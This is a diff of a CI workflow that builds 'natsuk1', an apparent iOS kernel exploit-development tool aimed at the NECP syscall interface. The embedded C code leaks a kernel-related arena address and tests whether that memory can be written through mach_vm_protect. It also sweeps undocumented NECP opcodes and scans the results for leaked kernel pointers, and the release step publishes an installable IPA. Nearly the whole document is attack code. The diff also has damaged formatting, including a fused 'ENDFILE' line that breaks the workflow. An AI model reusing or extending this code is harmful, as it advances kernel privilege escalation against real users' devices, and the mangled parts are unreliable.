@@ -138,8 +138,9 @@ jobs:
 
           #define NECP_ADD_CLIENT 0x01
           #define NECP_COPY_RESULT 0x04
+          #define NECP_COPY_LIST 0x05
+          #define NECP_COPY_INTERFACE 0x09
           #define NECP_ADD_FLOW 0x11
-          #define NECP_REMOVE_FLOW 0x12
           #define NECP_SYSCTL_ARENA 0x0D
           #define GATE_BYTE 9
 
@@ -223,29 +224,120 @@ jobs:
               return found;
           }
 
-          static kern_return_t vm_read_at(mach_vm_address_t addr, void *buf, size_t len, mach_vm_size_t *outsz) {
-              return mach_vm_read_overwrite(mach_task_self(), addr, len,
-                                            (mach_vm_address_t)(uintptr_t)buf, outsz);
-          }
-
-          static kern_return_t vm_write_at(mach_vm_address_t addr, const void *buf, size_t len) {
-              return mach_vm_write(mach_task_self(), addr,
-                                   (vm_offset_t)(uintptr_t)buf, (mach_msg_type_number_t)len);
-          }
-
-          static int step_arena_full_dump(void) {
+          static int step_mach_vm_protect(uint64_t uva) {
               nk_log("");
-              LI("S1", "arena leak + full dump");
+              LI("S1", "mach_vm_protect on arena 0x%llx", (unsigned long long)uva);
+
+              mach_port_t task = mach_task_self();
+
+              uint8_t before[64];
+              memset(before, 0, sizeof(before));
+              mach_vm_size_t outsz = 0;
+              kern_return_t kr = mach_vm_read_overwrite(task, uva,
+                                                        sizeof(before),
+                                                        (mach_vm_address_t)(uintptr_t)before,
+                                                        &outsz);
+              LI("S1", "read before kr=%d", kr);
+              if (kr != KERN_SUCCESS) { return -1; }
+
+              uint64_t marker = 0xdeadbeefcafebabeULL;
+              kr = mach_vm_write(task, uva,
+                                 (vm_offset_t)(uintptr_t)&marker, 8);
+              LI("S1", "vm_write (no protect) kr=%d", kr);
+
+              vm_address_t page = (vm_address_t)uva & ~0xfffULL;
+              vm_size_t psize = 0x4000;
+              kr = mach_vm_protect(task, page, psize, FALSE,
+                                   VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
+              LI("S1", "vm_protect RW_COPY kr=%d", kr);
+
+              kr = mach_vm_write(task, uva,
+                                 (vm_offset_t)(uintptr_t)&marker, 8);
+              LI("S1", "vm_write (after protect RW_COPY) kr=%d", kr);
+
+              kr = mach_vm_protect(task, page, psize, FALSE,
+                                   VM_PROT_READ | VM_PROT_WRITE);
+              LI("S1", "vm_protect RW kr=%d", kr);
+
+              kr = mach_vm_write(task, uva,
+                                 (vm_offset_t)(uintptr_t)&marker, 8);
+              LI("S1", "vm_write (after protect RW) kr=%d", kr);
+
+              uint8_t after[64];
+              memset(after, 0, sizeof(after));
+              outsz = 0;
+              kr = mach_vm_read_overwrite(task, uva, sizeof(after),
+                                          (mach_vm_address_t)(uintptr_t)after, &outsz);
+              LI("S1", "read after kr=%d", kr);
+
+              int changed = 0;
+              for (int i = 0; i < 64; i++) if (before[i] != after[i]) changed++;
+              LI("S1", "bytes changed: %d", changed);
+              if (changed > 0) {
+                  LO("S1", "ARENA WRITE POSSIBLE via vm_protect!");
+                  hexdump("S1H", after, 64, 64);
+              }
+              return 0;
+          }
+
+          static int step_copy_list(void) {
+              nk_log("");
+              LI("S2", "op=0x05 copy_list");
 
               int fd = nfd();
-              if (fd < 0) { LE("S1", "open errno=%d", errno); return -1; }
+              if (fd < 0) { LE("S2", "open errno=%d", errno); return -1; }
+
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
+              uint8_t fu[16];
+              if (nadd_flow(fd, cu, fu) != 0) { close(fd); return -1; }
+              if (nadd_client(fd, cu) != 0) {}
+
+              uint8_t buf[RESBUF]; memset(buf, 0, sizeof(buf));
+              int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_LIST,
+                                   (void*)cu, (size_t)16, buf, (size_t)sizeof(buf));
+              LI("S2", "op=0x05 returned %d", c);
+              close(fd);
+              if (c > 0) {
+                  hexdump("S2H", buf, c, 512);
+                  int nk = scan_kptr("S2K", buf, c);
+                  LI("S2", "kptr count = %d", nk);
+              }
+              return c;
+          }
+
+          static int step_copy_interface(void) {
+              nk_log("");
+              LI("S3", "op=0x09 copy_interface, index sweep 1..20");
+
+              int fd = nfd();
+              if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
+
               uint8_t cu[16]; memset(cu, 0, sizeof(cu));
               if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
 
-              uint64_t uva = 0;
-              int rc = nleak_kva(fd, &uva);
-              LI("S1", "leak rc=%d uva=0x%llx", rc, (unsigned long long)uva);
-              if (rc != 0) { close(fd); return -1; }
+              for (uint32_t idx = 1; idx <= 20; idx++) {
+                  uint8_t ibuf[4];
+                  memcpy(ibuf, &idx, 4);
+                  uint8_t buf[256]; memset(buf, 0, sizeof(buf));
+                  int c = (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_INTERFACE,
+                                       (void*)ibuf, (size_t)4, buf, (size_t)0x74);
+                  if (c > 0) {
+                      LI("S3", "idx=%u returned %d", idx, c);
+                      hexdump("S3H", buf, c, 0x74);
+                      int nk = scan_kptr("S3K", buf, c);
+                      LI("S3", "  kptr count = %d", nk);
+                  } else {
+                      LI("S3", "idx=%u ret=%d", idx, c);
+                  }
+              }
+              close(fd);
+              return 0;
+          }
+
+          static int step_recheck_arena(uint64_t uva) {
+              nk_log("");
+              LI("S4", "recheck arena 0x%llx", (unsigned long long)uva);
 
               mach_port_t task = mach_task_self();
               vm_address_t a = (vm_address_t)uva;
@@ -257,138 +349,22 @@ jobs:
               kern_return_t kr = vm_region_64(task, &a, &size,
                                               VM_REGION_BASIC_INFO_64,
                                               (vm_region_info_t)&info, &cnt, &obj);
-              LI("S1", "vm_region at 0x%llx kr=%d size=0x%llx prot=%d maxprot=%d",
-                 (unsigned long long)uva, kr,
-                 (unsigned long long)size, info.protection, info.max_protection);
+              LI("S4", "vm_region kr=%d start=0x%llx size=0x%llx prot=%d",
+                 kr, (unsigned long long)a, (unsigned long long)size, info.protection);
 
-              if (size == 0) size = 0x4000;
-              if (size > 0x10000) size = 0x10000;
+              if (kr == KERN_SUCCESS && size < 0x100000) {
+                  static uint8_t big[65536];
+                  memset(big, 0, sizeof(big));
+                  mach_vm_size_t got = 0;
+                  kr = mach_vm_read_overwrite(task, uva, size < sizeof(big) ? size : sizeof(big),
+                                              (mach_vm_address_t)(uintptr_t)big, &got);
+                  LI("S4", "read kr=%d got=%llu", kr, (unsigned long long)got);
+                  int nk = scan_kptr("S4K", big, (int)got);
+                  LI("S4", "kptr count in full arena = %d", nk);
 
-              static uint8_t arena[65536];
-              memset(arena, 0, sizeof(arena));
-              mach_vm_size_t outsz = 0;
-              kr = vm_read_at((mach_vm_address_t)uva, arena, size, &outsz);
-              LI("S1", "vm_read kr=%d outsz=%llu (requested %llu)",
-                 kr, (unsigned long long)outsz, (unsigned long long)size);
-
-              if (kr == KERN_SUCCESS) {
-                  LI("S1", "full arena dump:");
-                  hexdump("S1H", arena, (int)outsz, 4096);
-                  int nk = scan_kptr("S1K", arena, (int)outsz);
-                  LI("S1", "kptr count = %d", nk);
-              }
-
-              close(fd);
-              return 0;
-          }
-
-          static int step_arena_multi_dump(void) {
-              nk_log("");
-              LI("S2", "3 clients, dump each arena separately");
-
-              int fds[3];
-              uint64_t uvas[3];
-              uint8_t cus[3][16];
-              for (int i = 0; i < 3; i++) {
-                  fds[i] = nfd();
-                  if (fds[i] < 0) { LE("S2", "open errno=%d", errno); return -1; }
-                  memset(cus[i], 0, 16);
-                  if (nadd_client(fds[i], cus[i]) != 0) { close(fds[i]); return -1; }
-                  uvas[i] = 0;
-                  int rc = nleak_kva(fds[i], &uvas[i]);
-                  LI("S2", "client#%d rc=%d uva=0x%llx",
-                     i, rc, (unsigned long long)uvas[i]);
-              }
-
-              for (int i = 0; i < 3; i++) {
-                  uint8_t buf[256];
-                  memset(buf, 0, sizeof(buf));
-                  mach_vm_size_t outsz = 0;
-                  kern_return_t kr = vm_read_at((mach_vm_address_t)uvas[i], buf, sizeof(buf), &outsz);
-                  LI("S2", "read client#%d kr=%d outsz=%llu",
-                     i, kr, (unsigned long long)outsz);
-                  if (kr == KERN_SUCCESS && outsz > 0) {
-                      hexdump("S2H", buf, (int)outsz, 256);
-                  }
-              }
-
-              for (int i = 0; i < 3; i++) close(fds[i]);
-              return 0;
-          }
-
-          static int step_arena_write_test(void) {
-              nk_log("");
-              LI("S3", "arena write test");
-
-              int fd = nfd();
-              if (fd < 0) { LE("S3", "open errno=%d", errno); return -1; }
-              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
-              if (nadd_client(fd, cu) != 0) { close(fd); return -1; }
-
-              uint64_t uva = 0;
-              int rc = nleak_kva(fd, &uva);
-              LI("S3", "leak rc=%d uva=0x%llx", rc, (unsigned long long)uva);
-              if (rc != 0) { close(fd); return -1; }
-
-              uint8_t before[64];
-              memset(before, 0, sizeof(before));
-              mach_vm_size_t outsz = 0;
-              kern_return_t kr = vm_read_at((mach_vm_address_t)uva, before, 64, &outsz);
-              LI("S3", "read before kr=%d outsz=%llu", kr, (unsigned long long)outsz);
-              hexdump("S3B", before, 64, 64);
-
-              uint64_t marker = 0xdeadbeefcafebabeULL;
-              kr = vm_write_at((mach_vm_address_t)(uva + 0x38), &marker, 8);
-              LI("S3", "vm_write kr=%d", kr);
-
-              uint8_t after[64];
-              memset(after, 0, sizeof(after));
-              outsz = 0;
-              kr = vm_read_at((mach_vm_address_t)uva, after, 64, &outsz);
-              LI("S3", "read after kr=%d outsz=%llu", kr, (unsigned long long)outsz);
-              hexdump("S3A", after, 64, 64);
-
-              int changed = 0;
-              for (int i = 0; i < 64; i++) if (before[i] != after[i]) changed++;
-              LI("S3", "bytes changed: %d", changed);
-              if (changed > 0) {
-                  LO("S3", "WRITE WORKED");
-              }
-
-              close(fd);
-              return 0;
-          }
-
-          static int step_arena_region_scan(void) {
-              nk_log("");
-              LI("S4", "scan region 0x103a00000-0x103b00000");
-
-              mach_port_t task = mach_task_self();
-              vm_address_t addr = 0x103a00000ULL;
-              vm_address_t limit = 0x103b00000ULL;
-              int n = 0;
-
-              while (addr < limit && n < 64) {
-                  vm_size_t size = 0;
-                  vm_region_basic_info_data_64_t info;
-                  mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
-                  mach_port_t obj = MACH_PORT_NULL;
-
-                  kern_return_t kr = vm_region_64(task, &addr, &size,
-                                                  VM_REGION_BASIC_INFO_64,
-                                                  (vm_region_info_t)&info, &cnt, &obj);
-                  if (kr != KERN_SUCCESS) {
-                      LI("S4", "stop at 0x%llx kr=%d", (unsigned long long)addr, kr);
-                      break;
-                  }
-                  LI("S4", "0x%llx - 0x%llx size=0x%llx prot=%d",
-                     (unsigned long long)addr,
-                     (unsigned long long)(addr + size),
-                     (unsigned long long)size,
-                     info.protection);
-                  addr += size;
-                  n++;
-                  if (size == 0) break;
+                  int nonzero = 0;
+                  for (int i = 0; i < (int)got; i++) if (big[i] != 0) nonzero = i;
+                  LI("S4", "last nonzero offset: 0x%x", nonzero);
               }
               return 0;
           }
@@ -396,7 +372,7 @@ jobs:
           static int impl(void) {
               nk_log("");
               nk_log("================================================================");
-              nk_log("natsuk1 v4.9 - NECP arena RW");
+              nk_log("natsuk1 v5.0 - NECP post-arena recon");
               nk_log("iOS 27.0 / iPhone14,5 / 24A437");
               nk_log("================================================================");
               nk_log("");
@@ -405,10 +381,20 @@ jobs:
               close(fd);
               LO("PRE", "necp_open OK");
 
-              step_arena_full_dump();
-              step_arena_multi_dump();
-              step_arena_region_scan();
-              step_arena_write_test();
+              int fd2 = nfd();
+              uint8_t cu[16]; memset(cu, 0, sizeof(cu));
+              if (nadd_client(fd2, cu) == 0) {
+                  uint64_t uva = 0;
+                  int rc = nleak_kva(fd2, &uva);
+                  if (rc == 0) {
+                      step_recheck_arena(uva);
+                      step_mach_vm_protect(uva);
+                  }
+              }
+              close(fd2);
+
+              step_copy_list();
+              step_copy_interface();
 
               nk_log("");
               nk_log("======== done ========");
@@ -418,7 +404,9 @@ jobs:
           int nk_necp_run(void) {
               if (__sync_lock_test_and_set(&g_busy, 1)) {
                   nk_log("[!] already running");
-                  return 1;
+                 
+
+ return 1;
               }
               g_cancel = 0;
               int rc = impl();
@@ -430,9 +418,7 @@ jobs:
               g_cancel = 1;
               nk_log("[!] cancel requested");
           }
-          ENDFILE
-
-      - name: Install tools
+          ENDFILE      - name: Install tools
         run: |
           brew install xcodegen ldid || true
           brew link --overwrite xcodegen ldid || true
@@ -482,7 +468,7 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v4.9 dev
+          NOTES="natsuk1 v5.0 dev
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
